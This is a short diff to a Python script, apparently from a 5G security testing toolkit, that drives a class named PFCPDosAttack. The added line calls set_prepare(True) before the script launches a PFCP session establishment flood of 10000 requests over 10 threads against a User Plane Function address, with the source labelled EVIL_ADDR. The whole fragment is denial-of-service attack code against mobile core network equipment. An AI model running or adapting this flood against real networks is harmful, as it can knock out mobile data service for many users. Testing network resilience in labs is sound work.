@@ -364,4 +364,5 @@ class PFCPDosAttack:
 
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
+objet_dos.set_prepare(True)
 objet_dos.Start_pfcp_session_establishment_flood(reqNbr=10000, num_threads=10)
